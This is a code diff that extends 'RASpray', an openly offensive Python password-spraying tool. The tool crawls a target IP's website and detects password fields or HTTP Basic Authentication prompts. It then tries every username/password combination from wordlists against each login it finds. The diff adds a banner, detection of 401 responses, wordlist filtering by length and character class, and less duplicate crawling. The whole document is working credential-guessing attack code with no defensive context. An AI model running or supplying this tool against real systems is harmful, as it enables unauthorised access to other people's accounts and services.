@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import sys
+import re
 import requests
 from bs4 import BeautifulSoup
 from requests.auth import HTTPBasicAuth
@@ -10,6 +11,21 @@ from urllib.parse import urljoin
 # Define the tool's name and version
 TOOL_NAME = "RASpray"
 VERSION = "1.0.0"
+
+# Function to display the RASPRAY banner
+def display_banner():
+    banner = r"""
+    
+    ██████╗  █████╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
+    ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
+    ██████╔╝███████║    ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ 
+    ██╔══██╗██╔══██║    ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  
+    ██║  ██║██║  ██║    ███████║██║     ██║  ██║██║  ██║   ██║   
+    ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
+                                                             
+    Version: 1.0.0
+    """
+    print(banner)
 
 # Function to display help message
 def display_help():
@@ -22,11 +38,17 @@ def display_help():
     Usage: {TOOL_NAME} [options]
 
     Options:
-        -h, --help      Show this help message and exit
-        -u, --users     Specify the file containing usernames
-        -p, --pass      Specify the file containing passwords
-        -i, --ip        Specify the target IP address
-        --version       Show the tool version and exit
+        -h, --help              Show this help message and exit
+        -u, --users             Specify the file containing usernames
+        -p, --pass              Specify the file containing passwords
+        -i, --ip                Specify the target IP address
+        --version               Show the tool version and exit
+        --min-len               Specify the minimum length of usernames or passwords
+        --max-len               Specify the maximum length of usernames or passwords
+        --uppercase             Require at least 1 uppercase letter
+        --lowercase             Require at least 1 lowercase letter
+        --numbers               Require at least 1 number
+        --special-chars         Require at least 1 special character (e.g., !, @, #)
     """
     print(help_text)
 
@@ -37,7 +59,7 @@ def display_version():
     """
     print(f"{TOOL_NAME} version {VERSION}")
 
-# Function to traverse a website and find password fields
+# Function to traverse a website and find password fields or BasicAuth requests
 def traverse_website(base_url, session, max_depth=3):
     """
     Traverses the website starting from the base URL. Follows links found on each page.
@@ -72,31 +94,43 @@ def traverse_website(base_url, session, max_depth=3):
             # Collect all links on the page
             for a in soup.find_all('a', href=True):
                 full_url = urljoin(base_url, a['href'])
-                links.append(full_url)
-                to_visit.append((full_url, depth + 1))
+                
+                # Only add unvisited links to the list
+                if full_url not in visited:
+                    links.append(full_url)
+                    to_visit.append((full_url, depth + 1))
 
         except RequestException as e:
             print(f"Error traversing {url}: {e}")
     
     return links
 
-# Function to check if a page contains a password field
+# Function to check if a page contains a password field or prompts BasicAuth
 def is_password_requested(url, session):
     """
-    Checks if the given page contains an input field for a password.
+    Checks if the given page contains an input field for a password or requests Basic Authentication.
 
     Args:
         url (str): The URL of the page to check.
         session (Session): The session object to make requests.
 
     Returns:
-        bool: True if the page contains a password field, False otherwise.
+        bool: True if the page contains a password field or prompts for Basic Authentication, False otherwise.
     """
     try:
-        response = session.get(url)
+        # Send a HEAD request first to avoid downloading the entire page if it's protected by BasicAuth
+        response = session.head(url, timeout=10)
+
+        # Check if BasicAuth is requested (401 Unauthorized)
+        if response.status_code == 401:
+            print(f"BasicAuth requested on {url}")
+            return True
+        
+        # If no BasicAuth, make a GET request and parse the HTML to check for password fields
+        response = session.get(url, timeout=10)
         soup = BeautifulSoup(response.text, 'html.parser')
         
-        # Look for input fields of type 'password'
+        # Parse HTML to look for password fields
         password_fields = soup.find_all('input', {'type': 'password'})
         
         if password_fields:
@@ -105,20 +139,59 @@ def is_password_requested(url, session):
         else:
             print(f"No password field on {url}")
             return False
+
     except RequestException as e:
         print(f"Error checking {url}: {e}")
         return False
 
+
+# Function to filter usernames or passwords based on user criteria
+def filter_by_criteria(items, min_len=None, max_len=None, uppercase=False, lowercase=False, numbers=False, special_chars=False):
+    """
+    Filters a list of usernames or passwords based on specified criteria.
+
+    Args:
+        items (list): A list of usernames or passwords to filter.
+        min_len (int): Minimum length.
+        max_len (int): Maximum length.
+        uppercase (bool): Require uppercase letters.
+        lowercase (bool): Require lowercase letters.
+        numbers (bool): Require numbers.
+        special_chars (bool): Require special characters.
+
+    Returns:
+        list: A filtered list of usernames or passwords.
+    """
+    filtered = []
+    
+    for item in items:
+        if min_len and len(item) < min_len:
+            continue
+        if max_len and len(item) > max_len:
+            continue
+        if uppercase and not re.search(r'[A-Z]', item):
+            continue
+        if lowercase and not re.search(r'[a-z]', item):
+            continue
+        if numbers and not re.search(r'\d', item):
+            continue
+        if special_chars and not re.search(r'[!@#$%^&*(),.?":{}|<>]', item):
+            continue
+        filtered.append(item)
+    
+    return filtered
+
 # Function to perform password spraying
-def password_spraying(ip_address, username_file, password_file):
+def password_spraying(ip_address, username_file, password_file, criteria):
     """
     Performs password spraying by attempting each username/password combination
-    on pages where password fields are found.
+    on pages where password fields are found or Basic Authentication is requested.
 
     Args:
         ip_address (str): The target IP address.
         username_file (str): Path to the file containing usernames.
         password_file (str): Path to the file containing passwords.
+        criteria (dict): Criteria for filtering usernames and passwords.
     """
     # Open the username and password files
     with open(username_file, 'r') as user_file:
@@ -126,11 +199,15 @@ def password_spraying(ip_address, username_file, password_file):
     
     with open(password_file, 'r') as pass_file:
         passwords = [line.strip() for line in pass_file.readlines()]
+
+    # Filter usernames and passwords by the specified criteria
+    usernames = filter_by_criteria(usernames, **criteria)
+    passwords = filter_by_criteria(passwords, **criteria)
     
     # Create a session to persist cookies across requests
     session = requests.Session()
 
-    # Traverse through the website and find pages with password fields
+    # Traverse through the website and find pages with password fields or BasicAuth
     base_url = f'http://{ip_address}'
     pages_to_check = traverse_website(base_url, session)
     
@@ -138,7 +215,7 @@ def password_spraying(ip_address, username_file, password_file):
         # Ensure we have a full URL to check
         full_url = urljoin(base_url, page)
         
-        # Check if the page requests a password
+        # Check if the page requests a password or BasicAuth
         if is_password_requested(full_url, session):
             # Try each username/password combination
             for username in usernames:
@@ -146,7 +223,7 @@ def password_spraying(ip_address, username_file, password_file):
                     print(f"Trying username: {username}, password: {password} on {full_url}")
                     
                     try:
-                        # Attempt to login with the credentials
+                        # Attempt to login with the credentials using BasicAuth
                         response = session.get(full_url, auth=HTTPBasicAuth(username, password), timeout=10)
                         
                         # Check if the authentication was successful
@@ -165,6 +242,9 @@ def main():
     """
     The main function that parses command-line arguments and initiates the password spraying process.
     """
+    # Display the banner
+    display_banner()
+
     # Check if the user requested help or version
     if len(sys.argv) > 1:
         if sys.argv[1] in ['-h', '--help']:
@@ -179,6 +259,16 @@ def main():
         print("Missing required arguments! Use --help for usage instructions.")
         sys.exit(1)
     
+    # Parse user-specified criteria
+    criteria = {
+        'min_len': int(sys.argv[sys.argv.index('--min-len') + 1]) if '--min-len' in sys.argv else None,
+        'max_len': int(sys.argv[sys.argv.index('--max-len') + 1]) if '--max-len' in sys.argv else None,
+        'uppercase': '--uppercase' in sys.argv,
+        'lowercase': '--lowercase' in sys.argv,
+        'numbers': '--numbers' in sys.argv,
+        'special_chars': '--special-chars' in sys.argv
+    }
+
     # Get the values of the provided arguments
     try:
         ip_address = sys.argv[sys.argv.index('-i') + 1]
@@ -189,7 +279,7 @@ def main():
         sys.exit(1)
     
     # Call the password spraying function
-    password_spraying(ip_address, username_file, password_file)
+    password_spraying(ip_address, username_file, password_file, criteria)
 
 if __name__ == '__main__':
     main()
